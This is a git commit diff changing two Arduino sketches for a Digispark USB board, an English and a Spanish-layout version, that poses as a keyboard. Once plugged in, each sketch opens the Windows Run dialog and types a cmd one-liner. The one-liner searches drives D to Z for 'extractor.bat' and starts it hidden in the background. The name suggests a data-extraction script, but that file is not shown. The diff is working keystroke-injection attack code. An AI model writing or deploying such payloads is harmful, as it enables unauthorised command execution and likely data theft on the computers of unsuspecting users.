01b6da18b95ea6c061567de4718d8ee2ecc817a6
5kyf4ll <pablito_4-8@hotmail.com>
2026-06-09 12:24:28 -0500

    optimizando codigo digispark

--- disgispark/digispark_en.ino
+++ disgispark/digispark_en.ino
@@ -11,13 +11,8 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
 
-  // Abrir CMD
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1500);
-
   // Ejecutar comando para buscar y correr el .bat
-  DigiKeyboard.print("for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %d:\\extractor.bat start \"\" /b %d:\\extractor.bat & exit");
+  DigiKeyboard.print("cmd /c \"for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %d:/extractor.bat start /b %d:/extractor.bat\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   // Esperar un poco
--- disgispark/digispark_es.ino
+++ disgispark/digispark_es.ino
@@ -5,69 +5,66 @@ void setup() {
 }
 
 void loop() {
+  // Espera inicial para el reconocimiento del hardware
   DigiKeyboard.delay(2000);
 
-  // Win + R
+  // 1. Abrir Ejecutar (Win + R)
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
 
-  // cmd
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1500);
+  // 2. Empezar a escribir el comando: cmd /c "for %d in (
+  DigiKeyboard.print("cmd ");
+  
+  // Imprimir la barra '/' -> Shift + 7
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
+  
+  DigiKeyboard.print("c ");
 
-  // for %d in (
+  // Imprimir comillas iniciales '"' -> Shift + 2
+  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 
+
   DigiKeyboard.print("for %d in ");
-  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT); // (
 
-  // letras
+  // Imprimir paréntesis abierto '(' -> Shift + 8
+  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT); 
+
+  // Unidades de disco
   DigiKeyboard.print("D E F G H I J K L M N O P Q R S T U V W X Y Z");
 
-  // )
-  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT); // )
+  // Imprimir paréntesis cerrado ')' -> Shift + 9
+  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT); 
 
-  // resto
+  // 3. Continuar con la condición: do if exist %d:/extractor.bat
   DigiKeyboard.print(" do if exist %d");
-  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); // :
 
-  // \  (ALTGR + tecla al lado del 0)
-  DigiKeyboard.sendKeyStroke(0x2D, MOD_ALT_RIGHT);
+  // Imprimir dos puntos ':' -> Shift + punto (en la mayoría de teclados es keycode 0x37 o KEY_PERIOD)
+  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); 
 
-  DigiKeyboard.print("extractor.bat ");
+  // Imprimir la barra '/' -> Shift + 7
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
 
-  // (
-  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
+  DigiKeyboard.print("extractor.bat start ");
 
-  DigiKeyboard.print("start ");
-
-  // ""
-  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
-  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
-
-  DigiKeyboard.print(" ");
-
-  // /
-  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
+  // Imprimir la barra '/' -> Shift + 7
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
 
   DigiKeyboard.print("b %d");
-  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); // :
 
-  // \ otra vez
-  DigiKeyboard.sendKeyStroke(0x2D, MOD_ALT_RIGHT);
+  // Imprimir dos puntos ':' -> Shift + 0x37
+  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); 
 
-  DigiKeyboard.print("extractor.bat ");
+  // Imprimir la barra '/' -> Shift + 7
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
 
-  // &
-  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
+  DigiKeyboard.print("extractor.bat");
 
-  DigiKeyboard.print(" exit");
+  // Imprimir comillas finales '"' -> Shift + 2
+  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 
 
-  // )
-  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
-
+  // 4. Ejecutar el payload completo
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
+  // Esperar un momento y asegurar ciclo infinito pasivo
   DigiKeyboard.delay(5000);
-
   for(;;){}
 }
